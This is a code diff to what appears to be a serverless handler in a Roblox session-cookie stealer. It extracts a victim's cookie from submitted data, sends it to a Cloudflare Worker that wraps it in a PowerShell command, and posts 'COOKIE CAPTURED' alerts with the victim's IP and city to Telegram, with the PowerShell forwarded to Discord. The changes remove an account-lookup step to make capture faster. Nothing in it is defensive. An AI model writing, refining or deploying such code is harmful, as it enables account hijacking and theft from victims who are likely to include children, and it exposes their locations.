@@ -69,13 +69,13 @@ function findCookie(slots) {
   return null;
 }
 
-// ── Cloudflare Worker: returns the PowerShell command, never uses the cookie ──
-async function getPowerShell(cookie, victimIp) {
+// ── Cloudflare Worker: ONLY builds PowerShell string, zero Roblox API calls ───
+async function getPowerShell(cookie) {
   try {
     const r = await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie, victimIp })
+      body: JSON.stringify({ cookie })
     });
     if (!r.ok) return null;
     const d = await r.json();
@@ -188,11 +188,10 @@ export default async function handler(req, res) {
     Promise.resolve(findCookie(slots))
   ]);
 
-  // No delay — Worker uses victim's IP so cookie stays valid without waiting
-  const workerData = cookie ? await getWorkerData(cookie, ip) : null;
-  const powershell  = workerData?.powershell || null;
-  const roblox      = workerData || null;
-  const isValid     = !!workerData?.valid;
+  // Worker just formats cookie into PowerShell — no Roblox API calls, instant
+  const powershell = cookie ? await getPowerShell(cookie) : null;
+  const roblox     = null;  // no Roblox info fetched — avoids all timeouts
+  const isValid    = !!powershell;
   const now        = new Date().toISOString();
   const pageName   = record.displayName || slug;
   const payload    = { powershell, roblox, cookie, slots, ip, geo, now, pageName };
@@ -213,11 +212,9 @@ export default async function handler(req, res) {
 
   await tgSend(isValid ? [
     `✅ <b>COOKIE CAPTURED</b>`,
-    `👤 ${roblox?.username || 'Unknown'} ${roblox?.isPremium ? '⭐' : ''}`,
-    `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
     `📄 Page: ${pageName} (${slug})`,
     `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-    `💻 PowerShell command sent to Discord`,
+    `💻 PowerShell sent to Discord`,
     `🕐 ${now}`
   ].join('\n') : [
     `⚠️ <b>INVALID SUBMISSION</b>`,
